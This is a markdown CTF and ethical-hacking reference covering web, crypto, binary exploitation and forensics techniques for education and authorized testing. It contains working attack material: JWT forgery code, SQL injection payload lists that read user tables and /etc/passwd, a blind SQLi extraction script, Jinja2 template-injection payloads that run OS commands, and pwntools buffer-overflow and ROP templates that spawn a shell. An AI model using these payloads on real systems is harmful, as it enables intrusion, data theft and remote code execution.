# CTF & Ethical Hacking — Complete Reference

> CTFs teach you to think adversarially. The best defenders are those who understand how to attack. This is for authorized competitions and education.

**All techniques here are for CTF competitions, authorized penetration testing, and security education only.**

---

## CTF Competition Types

```
Jeopardy (most common):
  Points for solving challenges in categories:
  Web, Crypto, Reversing, Pwn (binary exploitation),
  Forensics, Misc, OSINT, Stego

Attack-Defense:
  Teams maintain their own services while attacking others
  Score = successful attacks + successful defenses

King of the Hill:
  Capture and hold a point/flag longer than others

Boot2Root / Hack The Box:
  Start with limited access, escalate to root
  Similar to real-world penetration testing
```

---

## Web Challenges

### Reconnaissance Checklist
```bash
# Every web challenge: start here
curl -I http://target/                    # Response headers
curl -v http://target/ 2>&1 | head -50   # Full request/response
curl http://target/robots.txt            # Disallowed paths
curl http://target/.well-known/          # .well-known directory
curl http://target/sitemap.xml           # Sitemap

# Source code review
view-source:http://target/               # HTML source
# Look for: comments, hidden form fields, JavaScript, API endpoints, TODO comments

# Hidden files and directories
gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
     -u http://target/FUZZ -mc 200,301,302,403 -t 50

# Technology fingerprinting
whatweb http://target/
wappalyzer (browser extension)

# JavaScript analysis
# Extract URLs/endpoints from JS files
grep -E "(https?://|/api/|/v[0-9]+/)" app.js
linkfinder.py -i http://target/ -d --output cli

# Check version numbers
curl http://target/ | grep -i "version\|v[0-9]\|powered by"
```

### JWT Exploitation
```python
# JWT structure: header.payload.signature (base64url encoded)
# header: {"alg": "HS256", "typ": "JWT"}
# payload: {"sub": "user1", "role": "user", "exp": 1234567890}

import base64
import json

def decode_jwt(token):
    """Decode JWT without verification."""
    parts = token.split('.')
    # Pad to multiple of 4 for base64url
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    return header, payload

# Attack 1: Algorithm None (alg=none)
# Server accepts JWT without signature if algorithm is "none"
import hmac
import hashlib

header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b'=').decode()

payload = base64.urlsafe_b64encode(
    json.dumps({"sub": "admin", "role": "admin"}).encode()
).rstrip(b'=').decode()

fake_jwt = f"{header}.{payload}."  # Empty signature

# Attack 2: RS256 → HS256 confusion
# If server uses RS256 (asymmetric), but accepts HS256 (symmetric),
# sign with the PUBLIC key as if it were an HMAC secret
# The server might verify using the public key as HMAC secret

# Attack 3: Brute force weak HMAC secret
def crack_jwt(token, wordlist_path):
    parts = token.split('.')
    msg = f"{parts[0]}.{parts[1]}"

    with open(wordlist_path) as f:
        for line in f:
            secret = line.strip().encode()
            expected = base64.urlsafe_b64encode(
                hmac.new(secret, msg.encode(), hashlib.sha256).digest()
            ).rstrip(b'=').decode()
            if expected == parts[2]:
                return secret.decode()

# Attack 4: Kid (Key ID) injection
# If header has "kid": "path/to/key", may be path traversal
# {"alg": "HS256", "kid": "../../dev/null"}
# Sign with empty string as secret

# Tools
# jwt_tool: https://github.com/ticarpi/jwt_tool
# python-jwt: pip install PyJWT
```

### SQL Injection Techniques
```python
# Detection
payloads_detect = [
    "'",                    # Error-based: single quote
    "\"",                   # Double quote
    "1' OR '1'='1",         # Boolean: always true
    "1' AND '1'='2",        # Boolean: always false
    "1' AND SLEEP(5)--",    # Time-based (MySQL)
    "1'; SELECT pg_sleep(5)--",  # Time-based (PostgreSQL)
    "1' WAITFOR DELAY '0:0:5'--",  # Time-based (MSSQL)
]

# UNION-based (requires matching columns and types)
# Step 1: Find number of columns
# ORDER BY 1--, ORDER BY 2--, ... until error
# OR: UNION SELECT NULL--, UNION SELECT NULL,NULL--

# Step 2: Find column with string type
# UNION SELECT 'test',NULL,NULL--
# UNION SELECT NULL,'test',NULL--

# Step 3: Extract data
# MySQL
"1 UNION SELECT table_name,NULL FROM information_schema.tables--"
"1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"
"1 UNION SELECT username,password FROM users--"

# PostgreSQL
"1 UNION SELECT table_name,NULL FROM information_schema.tables--"
"1 UNION SELECT current_user,version()--"
"1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"
"' UNION SELECT 1,pg_read_file('/etc/passwd')--"  # If superuser!

# SQLite
"1 UNION SELECT name,sql FROM sqlite_master WHERE type='table'--"
"1 UNION SELECT username,password FROM users--"

# Blind boolean-based (no visible output)
# Binary search on data character by character
import requests

def blind_sqli(url, param, query):
    """Extract data character by character using blind SQLi."""
    result = ""
    for pos in range(1, 50):
        low, high = 32, 127
        while low < high:
            mid = (low + high) // 2
            # MySQL: substring + ascii
            payload = f"1' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}--"
            r = requests.get(url, params={param: payload})
            if "expected_true_condition" in r.text:
                low = mid + 1
            else:
                high = mid
        if low == 32:
            break
        result += chr(low)
    return result

# Automate with sqlmap (always in authorized tests)
# sqlmap -u "http://target.com/search?q=1" --dbs
# sqlmap -u "http://target.com/" --data="user=admin&pass=1" --method POST --dbs
```

### Server-Side Template Injection (SSTI)
```
Detection payload: {{7*7}} or ${7*7} or #{7*7} or <%= 7*7 %>
If page shows 49 (or similar), it's vulnerable!

Template engines:
  Jinja2 (Python Flask): {{config.items()}}
  Twig (PHP): {{7*7}}
  Velocity (Java): #set($x=1+1)${x}
  FreeMarker (Java): ${1+1}
  ERB (Ruby): <%= 7*7 %>

Jinja2 RCE payloads:
  {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

  {{''.__class__.__mro__[1].__subclasses__()}}  # List all subclasses
  {{''.__class__.__mro__[1].__subclasses__()[400]('id',shell=True,stdout=-1).communicate()}}

  # More reliable:
  {% for x in ().__class__.__base__.__subclasses__() %}
    {% if "warning" in x.__name__ %}
      {{x()._module.__builtins__['__import__']('os').popen('id').read()}}
    {%endif%}
  {%endfor%}
```

---

## Cryptography Challenges

### Common Encoding/Encryption Recognition
```python
import base64
import codecs
import string

# Base64: a-zA-Z0-9+/=
def is_base64(s):
    try:
        base64.b64decode(s, validate=True)
        return True
    except: return False

# Base64url: a-zA-Z0-9-_=
def from_base64url(s):
    return base64.urlsafe_b64decode(s + '==')

# Hex: 0-9a-fA-F
def from_hex(s):
    return bytes.fromhex(s)

# ROT13
def rot13(s): return codecs.decode(s, 'rot13')
def caesar_brute(s):
    return [
        ''.join(chr((ord(c) - 65 + i) % 26 + 65) if c.isalpha() else c for c in s.upper())
        for i in range(26)
    ]

# XOR with single byte key
def xor_single_key(data: bytes) -> tuple[int, bytes]:
    """Brute force single-byte XOR key using frequency analysis."""
    best = (0, 0, b'')
    for key in range(256):
        decrypted = bytes([b ^ key for b in data])
        # Score based on English letter frequency
        score = sum(decrypted.count(c) for c in b'etaoinshrdlu ETAOINSHRDLU')
        if score > best[0]:
            best = (score, key, decrypted)
    return best[1], best[2]

# XOR with multi-byte key (Vigenere-like)
def find_xor_key_length(data: bytes, max_len: int = 40) -> int:
    """Find XOR key length using Hamming distance/coincidence index."""
    scores = []
    for key_len in range(2, max_len):
        # Compare consecutive blocks
        distances = []
        for i in range(0, min(len(data) - key_len * 2, key_len * 8), key_len):
            b1 = data[i:i+key_len]
            b2 = data[i+key_len:i+key_len*2]
            distance = bin(int.from_bytes(bytes(a ^ b for a, b in zip(b1, b2)), 'big')).count('1')
            distances.append(distance / key_len)
        scores.append((sum(distances) / len(distances), key_len))
    return min(scores)[1]

# Hash identification by length
def identify_hash(h: str) -> str:
    lengths = {32: 'MD5', 40: 'SHA1', 56: 'SHA224', 64: 'SHA256', 96: 'SHA384', 128: 'SHA512'}
    if h.startswith('$2'): return 'bcrypt'
    if h.startswith('$argon2'): return 'Argon2'
    return lengths.get(len(h), f'Unknown ({len(h)} chars)')
```

### Number Theory (RSA Attacks)
```python
from math import gcd
from sympy import factorint, isprime

# RSA: n=p*q, e=65537, d=e^-1 mod phi(n), cipher=m^e mod n, plain=c^d mod n

# Attack 1: Small n → factor it
n = 1234567890123456789
factors = factorint(n)  # Works for small n

# Attack 2: Two RSA keys sharing a prime factor
def common_factor_attack(n1, n2):
    g = gcd(n1, n2)
    if g > 1:
        p = g
        q1, q2 = n1 // p, n2 // p
        return p, q1, q2
    return None

# Attack 3: Low public exponent e=3 with small plaintext
# If m^3 < n, then c = m^3 exactly (no modular reduction)
import gmpy2
def e3_small_plaintext(c: int) -> int:
    m, exact = gmpy2.iroot(c, 3)
    if exact:
        return int(m)
    return None

# Attack 4: Hastad's broadcast attack (e=3, same message, 3 different moduli)
from sympy.ntheory.modular import crt

def hastad(c_list, n_list, e=3):
    # CRT to combine: find M such that M ≡ ci (mod ni)
    M_e, N = crt(n_list, c_list)
    m, exact = gmpy2.iroot(M_e, e)
    return int(m) if exact else None

# RSA decryption
def rsa_decrypt(c: int, d: int, n: int) -> bytes:
    m = pow(c, d, n)
    return m.to_bytes((m.bit_length() + 7) // 8, 'big')

# Calculate private key from p, q, e
def compute_private_key(p: int, q: int, e: int) -> int:
    phi = (p - 1) * (q - 1)
    return pow(e, -1, phi)  # Python 3.8+: modular inverse
```

---

## Binary Exploitation (PWN)

### Buffer Overflow Basics
```python
from pwn import *

# Connect to target
p = process('./binary')     # Local
p = remote('target', 1337)  # Remote

# Find offset to return address
# 1. Generate pattern: cyclic(200)
# 2. Run until crash
# 3. Find offset: cyclic_find(0x61616173)  # Value in EIP/RIP

offset = 64  # Found via pattern or fuzzing

# 32-bit (x86) stack-based buffer overflow
payload = b'A' * offset
payload += p32(win_function_addr)  # Little-endian 32-bit address
p.sendline(payload)
p.interactive()

# 64-bit (x64) return-to-libc
payload = b'A' * offset
# Need to align stack for 64-bit (RSP must be 16-byte aligned before call)
payload += p64(ret_gadget)         # Stack alignment gadget (just a 'ret')
payload += p64(pop_rdi_gadget)     # pop rdi; ret
payload += p64(binsh_addr)         # "/bin/sh" address in libc
payload += p64(system_addr)        # system() address in libc
p.sendline(payload)
p.interactive()

# Finding gadgets
# ROPgadget --binary ./binary --rop
# ropper -f ./binary

# libc address leaking (ASLR bypass)
# 1. Call puts(puts@got) to print puts address
# 2. Calculate libc base: libc_base = puts_addr - puts_offset
# 3. Calculate system: system_addr = libc_base + system_offset
```

### Useful pwntools
```python
from pwn import *

# Setup
context.binary = elf = ELF('./binary')
context.arch = 'amd64'
context.log_level = 'debug'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Address lookups
elf.symbols['main']      # Function address
elf.got['puts']          # GOT entry for puts
elf.plt['puts']          # PLT stub for puts

libc.symbols['system']   # system() offset in libc
libc.search(b'/bin/sh\x00')  # Find /bin/sh in libc

# ROP chain
rop = ROP(elf)
rop.puts(elf.got['puts'])        # puts(puts@got)
rop.main()                        # Return to main

# Format string exploitation
# %n: write number of bytes printed so far to address
# %x: read from stack
# %7$x: read 7th argument from stack
# %hn: write 2 bytes

payload = fmtstr_payload(offset, {target_addr: value})
```

---

## Forensics

```bash
# File analysis
file suspicious           # Determine file type
strings suspicious        # Printable strings
xxd suspicious | head     # Hex dump
binwalk suspicious        # Find embedded files
binwalk -e suspicious     # Extract embedded files

# Images
exiftool image.jpg        # EXIF metadata (GPS, camera, timestamps)
identify -verbose image.png  # ImageMagick metadata
zsteg image.png           # LSB steganography
steghide info image.jpg   # Check for hidden data
steghide extract -sf image.jpg -p password  # Extract

# Audio
# Open in Audacity, view spectrogram (many hidden messages in audio spectrum)
# View → Plot Spectrum for frequency analysis

# Network captures
tshark -r capture.pcap                    # Overview
tshark -r capture.pcap -T fields -e http.request.uri -e http.file_data
# Filter: http, dns, tcp.stream eq 0
# Follow TCP stream in Wireshark: right-click → Follow → TCP Stream

# Memory forensics (Volatility 3)
python vol.py -f memory.dmp windows.pslist   # Process list
python vol.py -f memory.dmp windows.cmdline  # Command lines
python vol.py -f memory.dmp windows.netscan  # Network connections
python vol.py -f memory.dmp windows.filescan # File handles
python vol.py -f memory.dmp windows.dumpfiles --pid 1234  # Dump process files

# Disk forensics
autopsy   # GUI forensics tool
fls image.dd    # List files (including deleted)
icat image.dd 45  # Extract inode 45
```

---

## CTF Tips and Strategy

```
Before starting a challenge:
  1. Read the description carefully (hints are hidden there)
  2. Check the file type: file challenge
  3. Look for strings: strings challenge
  4. Note the challenge category and difficulty

Web challenges:
  → Always check source, cookies, headers, JavaScript
  → Try common paths: /admin, /api, /backup, /.git, /.env
  → Burp Suite for everything: intercept, modify, replay

Crypto challenges:
  → Identify the algorithm from ciphertext properties
  → Look for repeating patterns → ECB mode or weak XOR
  → Short ciphertext → likely substitution cipher → frequency analysis
  → RSA challenge → look for small e, common factors, weak primes

Reversing challenges:
  → strings binary → might find flag or crypto keys
  → ltrace/strace → trace function calls
  → Ghidra or IDA → decompile to pseudocode
  → Dynamic analysis in GDB → breakpoints, examine state

Pwn challenges:
  → checksec binary → what protections are enabled?
  → NX disabled → shellcode on stack
  → PIE disabled → fixed addresses, easier ROP
  → Stack canary → need to leak or bypass

Forensics:
  → Metadata is your friend (EXIF, PDF metadata, Word metadata)
  → Steganography in images/audio is common
  → Network captures: look for passwords, flags in HTTP

When stuck:
  → Read the description again
  → Check if there's a hint available
  → Look at similar challenges in writeups (after the CTF ends)
  → Take a break — fresh eyes spot things
```

---

*CTFs are the gymnasium for security skills. Every challenge solved is a new technique learned. The knowledge you gain goes directly into making systems more secure.*
